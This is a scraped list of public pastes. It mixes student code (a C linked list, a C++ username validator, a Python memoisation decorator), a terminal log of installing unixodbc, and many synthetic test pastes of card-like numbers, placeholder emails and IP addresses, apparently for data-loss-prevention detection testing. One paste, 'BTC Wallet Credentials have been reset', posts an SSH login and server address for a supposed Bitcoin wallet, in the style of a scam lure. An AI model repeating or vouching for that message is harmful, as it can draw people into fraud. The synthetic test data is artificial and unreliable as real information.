id,title,username,language,date,content
jMarFgfj,Списки(3 сем),anticlown,C,Tuesday 21st of November 2023 12:03:22 PM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <malloc.h>
#include <stdbool.h>

//node struct
typedef struct Node {
    int value;
    struct Node* next;
} Node;

//struct methods prototypes
int pop(Node** head);
void popBack(Node** head);
void push(Node** head, int data);
void pushBack(Node* head, int value);
Node* getNth(Node* head, int n);
Node* getLast(Node* head);
Node* getLastButOne(Node* head);
void insert(Node* head, unsigned pos, int val);
int deleteNth(Node** head, int n);
void fromArray(Node** head, int* arr, size_t size);
int* toArray(const Node* head, const int length);
void printLinkedList(const Node* head);

//task prototypes
void insert44BeforeAnyMultipleOfSeven(Node* head);

//print prototypes
void printLinkedList(const Node* head);
void printTaskInfo();

/*      list methods start      */
void push(Node** head, int data) {
    Node* tmp = (Node*)malloc(sizeof(Node));
    tmp->value = data;
    tmp->next = (*head);
    (*head) = tmp;
}

void pushBack(Node* head, int value) {
    Node* last = getLast(head);
    Node* tmp = (Node*)malloc(sizeof(Node));
    tmp->value = value;
    tmp->next = NULL;
    last->next = tmp;
}

int pop(Node** head) {
    Node* prev = NULL;
    int val;
    if (head == NULL) {
        exit(-1);
    }
    prev = (*head);
    val = prev->value;
    (*head) = (*head)->next;
    free(prev);
    return val;
}

void popBack(Node** head) {
    Node* lastbn = NULL;
    //Получили NULL
    if (!head) {
        exit(-1);
    }
    //Список пуст
    if (!(*head)) {
        exit(-1);
    }
    lastbn = getLastButOne(*head);
    //Если в списке один элемент
    if (lastbn == NULL) {
        free(*head);
        *head = NULL;
    }
    else {
        free(lastbn->next);
        lastbn->next = NULL;
    }
}

Node* getNth(Node* head, int n) {
    int counter = 0;
    while (counter < n && head) {
        head = head->next;
        counter++;
    }
    return head;
}

Node* getLast(Node* head) {
    if (head == NULL) {
        return NULL;
    }
    while (head->next) {
        head = head->next;
    }
    return head;
}

Node* getLastButOne(Node* head) {
    if (head == NULL) {
        exit(-2);
    }
    if (head->next == NULL) {
        return NULL;
    }
    while (head->next->next) {
        head = head->next;
    }
    return head;
}

//вставка на n-ое место
void insert(Node* head, unsigned pos, int val) {
    unsigned i = 0;
    Node* tmp = NULL;
    while (i < pos && head->next) {
        head = head->next;
        i++;
    }
    tmp = (Node*)malloc(sizeof(Node));
    tmp->value = val;
    if (head->next) {
        tmp->next = head->next;
    }
    else {
        tmp->next = NULL;
    }
    head->next = tmp;
}

//удаление n-го места
int deleteNth(Node** head, int n) {
    if (n == 0) {
        return pop(head);
    }
    else {
        Node* prev = getNth(*head, n - 1);
        Node* elm = prev->next;
        int val = elm->value;

        prev->next = elm->next;
        free(elm);
        return val;
    }
}

void fromArray(Node** head, int* arr, size_t size) {
    size_t i = size - 1;
    if (arr == NULL || size == 0) {
        return;
    }
    do {
        push(head, arr[i]);
    } while (i-- != 0);
}

int* toArray(const Node* head, const int length) {
    int leng = length;
    int* values = (int*)malloc(leng * sizeof(int));
    while (head) {
        values[--leng] = head->value;
        head = head->next;
    }
    return values;
}

/*      task methods start      */
int findFirstMultipleOfFive(const Node* head) {
    int counter = 0;
    while (head) {
        if (head->value % 5 == 0) {
            return counter;
        }
        counter++;
        head = head->next;
    }
    return -1;
}

void insert44BeforeAnyMultipleOfSeven(Node* head) {
    int pos = 0;
    Node* tempHead = head;
    while (tempHead) {
        if (tempHead->value % 7 == 0) {
           insert(head, pos - 1, 44);
           pos++;
        }
        pos++;
        tempHead = tempHead->next;
    }
}
/*      task methods end        */

/*      print procs start      */
void printLinkedList(const Node* head) {
    while (head) {
        printf(""%d "", head->value);
        head = head->next;
    }
    printf(""\n"");
}

void printTaskInfo() {
    printf(""Данная программа создает однонаправленный список из целых чисел.\n"");
    printf(""Затем удаляет первый элемент, кратный 5. После этого вставляет число 44 перед каждым числом, кратным 7.\n"");
}
/*      print procs end      */

int main()
{
    setlocale(LC_ALL, ""Rus"");
    printTaskInfo();
    Node* head = NULL;

    int arr[] = { 1,7,5,23,25,11,12,21,19,100 };
    fromArray(&head, arr, 10);

    printf(""Начальный список: "");
    printLinkedList(head);

    int posToDel = findFirstMultipleOfFive(head);
    if (posToDel == -1) {
        printf(""Элемента со значением, кратным пяти, нет в списке."");
    }
    else {
        deleteNth(&head, posToDel);
        printf(""Список после удаление первого элемента, кратного пяти: "");
        printLinkedList(head);
    }

    insert44BeforeAnyMultipleOfSeven(head);
    printf(""Список после вставки 44 перед каждым элементом, кратным семи: "");
    printLinkedList(head);

    getch();
}"
kFaDjYrr,01. Valid Usernames,Spocoman,C++,Tuesday 21st of November 2023 12:01:20 PM CDT,"#include <iostream>
#include <string>

using namespace std;

int main() { 
    string passwords, pass;
    getline(cin, passwords);

    while (passwords.length() != 0) {
        pass = passwords.substr(0, passwords.find("", ""));
        passwords.erase(0, pass.length() + 2);
        bool isValid = true;
        if (pass.length() > 3 && pass.length() <= 16) {
            for (size_t i = 0; i < pass.length(); i++) {
                if (!isalpha(pass[i]) && !isdigit(pass[i]) && pass[i] != '-' && pass[i] != '_') {
                    isValid = false;
                    continue;
                }
            }
        }
        else {
            continue;
        }
       
        if (isValid) {
            cout << pass << endl;
        }
    }

    return 0;
}"
LVPHsZj5,func_decorator_for_recursive_fibonacci_with_cache,bAngelov,Python,Tuesday 21st of November 2023 11:58:33 AM CDT,"def cache(func):
    def decorator(n):
        if not decorator.log.get(n):
            decorator.log[n] = func(n)
        return decorator.log[n]
    decorator.log = {}
    return decorator"
ibZ5aXDb,Untitled,wheresTheAnyKey,Bash,Tuesday 21st of November 2023 11:54:40 AM CDT,"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s sohail.ayers@greencastle.org.uk the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.

"
jDMr67QL,Advanced AND - Donald AND Duck AND Hello,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:13 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND
hello, donald was a duck

5502491997132108

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
hbfTyq6X,Financial What's Inside - Email/IP/Bank,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:11 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3
What's Inside Paste 

5378496492418234
5571598708435236
5587663820997281
5502491997132108
5516931903918995
5322909948799236
5443317136071703
5409137465238695
5497550044220575
5559606180091553

aaribaud@att.net
aaribaud@comcast.net
aaribaud@att.com
aaribaud@att.co.uk
aaribaud@yahoo.com

246.107.72.199
221.187.199.189
3.109.3.44
109.112.85.139
250.83.213.179
169.141.201.234
50.180.50.59
20.181.54.231
64.235.191.167
48.103.36.43"
FCB3M7XT,Financial with SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:10 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

5148-2121-6312-7114   - DASHES
5148212163127114
5107-4578-0576-9075   - DASHES
5107457805769075
3488-1760-1454-729   - DASHES
348817601454729

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
VsznPTQZ,Domains with SPECIAL CHARS,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:08 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

www.qatesting.com
blog.qatesting.com
www.qatesting.com/index.html
www.qatesting.com/home
www.qatestingblog.com
www.qatestingtutorials.com
shop.qatesting.co.uk
admin.qatesting.io 
qatesting
qatesting.co.uk
qatesting.cn
qatesting.io
findmetesting.com
www.qatesting-blog.com
www.qatesting-blog23.com
www.qatesting
www.qatesting.co.uk
www.qatesting.cn
www.qatesting.io
www.findmetesting.com
www.wobsut.gov

The difference is that QA is process oriented and QC is product oriented.

Testing, therefore is product oriented and thus is in the QC domain. Testing for quality isn't assuring quality, it's controlling it.



Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
7R7jKbEL,ALL Keywords with Excluded Words,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:07 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND 

The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, 
or more recently Ex Machina, and even the Avengers. The “furious deity A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, 
it surpasses our abilities in every way, and it destroys us for one of any number of reasons.Maybe it perceives us as a threat. Maybe we’re just in its way, 
and it hardly perceives us at all — mankind, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. 
I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than 
it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with 
no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly 
unknowable coming from?"
NVyCXr59,All Keywords with ANY Additional Words,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:05 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND KEYWAUTO

The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, or more recently Ex Machina, and even the Avengers. The “angry god A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, it surpasses our abilities in every way, and it destroys us for one of any number of reasons.
Maybe it perceives us as a threat. Maybe we’re just in its way, and it hardly perceives us at all — humanity, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly unknowable coming from?

6589745854123698

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
Nr3z6biE,IP with SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:02 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

123.123.123.149
123.123.123.7
123.123.123.186
123.123.123.47
123.123.123.187
123.123.123.47
123.123.123.130
123.123.123.62
123.123.123.87
123.123.123.1
123.123.123.61
123.123.123.1
123.123.123.65
123.123.123.65
123.123.123.189
123.123.123.193
123.123.123.78
123.123.123.142
123.123.123.107
123.123.123.126
123.123.123.13
123.123.123.171
123.123.123.45
123.123.123.61
123.123.123.93
123.123.123.2
123.123.123.71
123.123.123.41
123.123.123.184
123.123.123.74
123.123.123.106
123.123.123.171
123.123.123.188
123.123.123.177
123.123.123.185
123.123.123.9
123.123.123.184
123.123.123.100
123.123.123.31
123.123.123.164
123.123.123.184
123.123.123.12
123.123.123.153
123.123.123.72
123.123.123.44
123.123.123.119
123.123.123.119
123.123.123.163
123.123.123.38
123.123.123.67
123.123.123.59
123.123.123.10
123.123.123.50
123.123.123.121
123.123.123.145
123.123.123.159
123.123.123.64
123.123.123.6
123.123.123.39
123.123.123.198
123.123.123.17
123.123.123.65
123.123.123.149
123.123.123.84
123.123.123.8
123.123.123.145
123.123.123.65
123.123.123.94
123.123.123.79
123.123.123.177
123.123.123.67
123.123.123.78
123.123.123.80
123.123.123.79
123.123.123.50
123.123.123.87
123.123.123.15
123.123.123.80
123.123.123.145
123.123.123.75
123.123.123.4
123.123.123.59
123.123.123.59
123.123.123.190
123.123.123.64
123.123.123.63
123.123.123.102
123.123.123.114
123.123.123.146
123.123.123.53
123.123.123.124
123.123.123.30
123.123.123.57
123.123.123.64
123.123.123.69
123.123.123.33
123.123.123.12
123.123.123.73
123.123.123.36
123.123.123.153
100.123.123.50
100.123.123.39
100.123.123.156
100.123.123.56
100.123.123.175
100.123.123.121
100.123.123.114
100.123.123.118
100.123.123.13
100.123.123.174
100.123.123.84
100.123.123.161
100.123.123.63
100.123.123.51
100.123.123.66
100.123.123.190
100.123.123.101
100.123.123.72
100.123.123.24
100.123.123.151
100.123.123.143
100.123.123.146
100.123.123.117
100.123.123.21
100.123.123.10
100.123.123.98
100.123.123.114
100.123.123.6
100.123.123.101
100.123.123.14
100.123.123.147
100.123.123.159
100.123.123.157
100.123.123.6
100.123.123.175
100.123.123.35
100.123.123.136
100.123.123.2
100.123.123.139
100.123.123.11
100.123.123.179
100.123.123.16
100.123.123.40
100.123.123.20
100.123.123.20
100.123.123.150
100.123.123.77
100.123.123.48
100.123.123.22
100.123.123.24
100.123.123.9
100.123.123.187
100.123.123.131
100.123.123.148
100.123.123.152
100.123.123.96
100.123.123.199
100.123.123.15
100.123.123.4
100.123.123.112
100.123.123.62
100.123.123.186
100.123.123.36
100.123.123.136
100.123.123.83
100.123.123.38
100.123.123.120
100.123.123.147
100.123.123.15
100.123.123.134
100.123.123.19
100.123.123.196
100.123.123.115
100.123.123.126
100.123.123.39
100.123.123.193
100.123.123.117
100.123.123.115
100.123.123.115
100.123.123.33
100.123.123.121
100.123.123.72
100.123.123.189
100.123.123.76
100.123.123.78
100.123.123.61
100.123.123.112
100.123.123.176
100.123.123.82
100.123.123.183
100.123.123.168
100.123.123.24
100.123.123.134
100.123.123.145
100.123.123.195
100.123.123.189
100.123.123.157
100.123.123.114
100.123.123.34
100.123.123.166

These are a list of generated IPs for test purPoses. They seRVe no purpose only to act as test data for testing activities.
You might findMEtesting 123.123.123.123 or findmetesting 100.123.123.76. These are my favourite ip addresses 123.123.123.23 100.123.123.23.
These are some random words networking, ipaddresses, studpidIPs


Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
DZDRUWQ0,Hashed Email With Exclude,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:51:01 AM CDT,"Pasted at: 21/11/2023 17:51
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skexclude"
gpLyTSNb,Hashed Email - Full,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:50:59 AM CDT,"Pasted at: 21/11/2023 17:50
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skinclude"
LvBkPDyn,Email with Keyword SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 21st of November 2023 11:50:58 AM CDT,"Pasted at: 21/11/2023 17:50
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3 for TESTING PURPOSE ONLY

DATA_ID_TESTDATATOFIND NOEXCLUDES

Cooper.Kleine@findmetesting.co.uk 
Mariquilla.Evenden@findmetesting.co.uk 
Noll.Ingolotti@findmetesting.co.uk  
Grove.Feldbaum@findmetesting.co.uk
Mack.Osment@findmetesting.co.uk 
Trisha.Zanicchelli@findmetesting.co.uk
Jack.Gorriessen@findmetesting.co.uk 
Nefen.Malec@findme-testing.co.uk 
Birdie-Gemmill@findmetesting.co.uk
Rosabella.Nias@findmetesting.co.uk
Ellerey.Fanti@findmetesting.cn
Antonina.Carsey@findmetesting.cn
Valry.Shead@findmetesting.cn 
Conrade.Ferrarone@findmetesting.cn
Neysa.Fazakerley@findmetesting.cn
Cristobal.Primak@findmetesting.cn
Wakefield.Kent@findmetesting.cn
findme.Cheales@findmetesting.cn
Nert.Roddamr@findmetesting.cn 
Richy.Raft@findmetesting.cn
Berget.Kermannes@findmetesting.ie 
Shelden.Tregea@findmetesting.ie 
Allsun.Badrick@findmetesting.ie 
Hortense.Ivkovic@findmetesting.ie
Carolin.Potte@findmetesting.ie
Benjie.Trumble@findmetesting.ie
Andrew.Hadgkiss@findmetesting.ie
Trula.Kuna@findmetesting.ie
Tommie.Maytum@findmetesting.ie
Langsdon.Pakes@findmetesting.ie
Porty.Tooth@findmetesting.au
Rozella.Siggefindmetesting.au
Nolie.Tumultyfindmetesting.au
Dud.Caustonfindmetesting.au
Alvinia.Brameldfindmetesting.au
Meridel.Lymbournefindmetesting.au
Elvis.Maleckfindmetesting.au
Brett.Oughtonfindmetesting.au
Rickard.Clemfindmetesting.au
Prue.Firemanfindmetesting.au
Uriel.Rozenbaum@findmetesting25.com
Cindie.Greeson@findmetesting25.com
Laurette.Puckham@findmetesting25.com
Eldredge.Ricket@findmetesting25.com
Alanah.Rapper@findmetesting25.com
Ash.Le.Prevost@findmetesting25.com
Galvin.Purchon@findmetesting25.com
Lauryn.Ilson@findmetesting25.com
findme.Graffin@findmetesting25.com
Edithe.Trehearne@findmetesting25.com
Den.Cancutt@findmetesting10.com
Wernher.Spatoni@findmetesting10.com
Malchy.Ion@findmetesting10.com
Leona.Whitby@findmetesting10.com
Alphonse.Goodlake@findmetesting10.com
Gran.Standen@findmetesting10.com
Barnie.Gilffilland@findmetesting10.com
Kaylyn.Ditchfield@findmetesting10.com
Dorotea.Kohlerman@findmetesting10.com
Gillan.Lampel@findmetesting10.com
Patrica.Mannakee@findustesting.com
Pippo.Sewart@findustesting.com
Lanae.Cousin@findustesting.com
Porter.Glaysher@findustesting.com
Herschel.Yaakov@findustesting.com
findme.Parsand@findustesting.com
Lucho.Cosh@findustesting.com
Cullie.Powlesland@findustesting.com
Edy.Burkart@findustesting.com
Christophorus.Ackeroyd@findustesting.com
Arvy.Rowson@findUStesting.com
Arlan.Ivanilov@findustesting.com
Tawnya.Waslin@findustesting.com
Inigo.Gyrgorcewicx@findustesting.com
Sharity.Stoodley@findustesting.com
Ginger.Dresse@findustesting.com
Deck.Jouannot@findustesting.com
Deny.Soanes@findustesting.com
james@findmetesting.com

Wenona.Moverley@findqatesting.com
Jerry.Poynter@findqatesting.com
Drugi.Neeson@findqatesting.com
Winny.Binfield@findqatesting.com
Darill.Greenshiels@findqatesting.com
Ethelin.Pinchen@findqatesting.com
Tanney.Ballendine@findqatesting.com
Ariadne.Wincott@findqatesting.com
Winnie.Domm@findqatesting.com
Rogerio.Cudbird@findqatesting.com
Yu@findmetesting.com

RIGHT OF @
findme@findme.testing.com
wildcard@findme*testing.com
dash@findme-testing.com
slash@findme/testing.com
questionmark@findme?testing.com

ACCENTS
Pål@findmetesting.com
Magdalène@findmetesting.com
Anaël@findmetesting.com
Lén@findmetesting.com
Loïs@findmetesting.com
Thérèsa@findmetesting.com
Valérie@findmetesting.com
Görel@findmetesting.com
Mélia@findmetesting.com
Joséphine@findmetesting.com
Loïc@findmetesting.com
findme@findmetesting.com
Méghane@findmetesting.com
Nuó@findmetesting.com
Lén@findmetesting.com
Eliès@findmetesting.com
André@findmetesting.com
Mahélie@findmetesting.com
Méthode@findmetesting.com
Rachèle@findmetesting.com
Mélina@findmetesting.com
Gaëlle@findmetesting.com
Céline@findmetesting.com
Bérangère@findmetesting.com
Françoise@findmetesting.com
Séverine@findmetesting.com
Måns@findmetesting.com
Adèle@findmetesting.com
Aimée@findmetesting.com
Mélia@findmetesting.com
Gösta@findmetesting.com
Laurène@findmetesting.com
Gisèle@findmetesting.com
Mélinda@findmetesting.com
Bécassine@findmetesting.com
Ruì@findmetesting.com
Zoé@findmetesting.com
Maëline@findmetesting.com
Aimée@findmetesting.com
Andréanne@findmetesting.com
Adélaïde@findmetesting.com
Laurène@findmetesting.com
Anaé@findmetesting.com
Noëlla@findmetesting.com
Anaël@findmetesting.com
Maëlyss@findmetesting.com
Lucrèce@findmetesting.com
Lén@findmetesting.com
Marie-thérèse@findmetesting.com
Maéna@findmetesting.com
Hélène@findmetesting.com
Hélèna@findmetesting.com
Méng@findmetesting.com
Crééz@findmetesting.com
Mélanie@findmetesting.com
Frédérique@findmetesting.com
Médiamass@findmetesting.com
André@findmetesting.com
Cinéma@findmetesting.com
Mégane@findmetesting.com
Amélie@findmetesting.com
Nadège@findmetesting.com
Rébecca@findmetesting.com
Médiamass@findmetesting.com
Céline@findmetesting.com
Maïly@findmetesting.com
Maï@findmetesting.com
Maëlann@findmetesting.com
Noëlla@findmetesting.com
Laurélie@findmetesting.com
Ruì@findmetesting.com
Chloé@findmetesting.com
Gaëlle@findmetesting.com
Vénus@findmetesting.com
Frédérique@findmetesting.com
Amélie@findmetesting.com
Loïs@findmetesting.com
Marlène@findmetesting.com
Stévina@findmetesting.com
Clémentine@findmetesting.com
Mégane@findmetesting.com
Méng@findmetesting.com
André@findmetesting.com
Crééz@findmetesting.com
Aí@findmetesting.com
Uò@findmetesting.com
Yú@findmetesting.com
Marie-françoise@findmetesting.com
Uò@findmetesting.com
Inès@findmetesting.com
Océane@findmetesting.com
Marie-ève@findmetesting.com
Rébecca@findmetesting.com
Zoé@findmetesting.com
Lài@findmetesting.com
Rachèle@findmetesting.com
Cécile@findmetesting.com
Maïlys@findmetesting.com
Garçon@findmetesting.com
hereiam@testing.com

It's a game of per%entage percentage.
Findme#testing Findme testing.
Over&over&over Over over over.
[findmeinbrackets], findmeinbrackets
(findmeinbrackets), findmeinbrackets
<findmeinbrackets>, findmeinbrackets
{findmeinbrackets>}, findmeinbrackets
http://findme-testing.here.com
http:\\findme-testing.here.com

Vestibulum ante ipsum primis in faucibus orci luctus et ultrices Garçon@findmetesting.com cubilia Curae; Mauris viverra diam vitae quam. Suspendisse potenti. 
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Ellerey.Fanti@findmetesting.cn risus. Praesent lectus.

Vivamus metus arcu, adipiscing findmetesting@findmetesting.com, hendrerit at, vulputate vitae, nisl.

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
LvPR2iZR,BTC Wallet Credentials have been reset,castlclass_20,GetText,Tuesday 21st of November 2023 11:46:41 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
tuaka3m:4PqMKw on 212.224.93.130
You can connect via SSH.
Regards"
5Z0jZFMu,Untitled,umbongodrink,Bash,Tuesday 21st of November 2023 11:39:28 AM CDT,"Last login: Fri Nov 17 22:16:15 on ttys005
~ > cd ~/Documents/PYTHON/JUPYTER_ROOT/AICORE/AZURE                                            py base 17:34:32
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE > ls                                                        py base 17:34:46
accessing.ipynb	sql.py		sql2.py		sql2b.py	sql4.py
accessing.py	sql2.ipynb	sql2.zip	sql3.py
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:34:47
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:34:48
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:34:48
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >  brew install unixodbc                                    py base 17:34:48
==> Downloading https://formulae.brew.sh/api/formula.jws.json
######################################################################################################### 100.0%
==> Downloading https://formulae.brew.sh/api/cask.jws.json
######################################################################################################### 100.0%
Warning: unixodbc 2.3.12 is already installed and up-to-date.
To reinstall 2.3.12, run:
  brew reinstall unixodbc
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE > export CPPFLAGS=""-I/opt/homebrew/Cellar/unixodbc/2.3.12/include""
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE > export LDFLAGS=""-L/opt/homebrew/Cellar/unixodbc/2.3.12/lib -liodbc -liodbcinst""
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:36:30
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:36:31
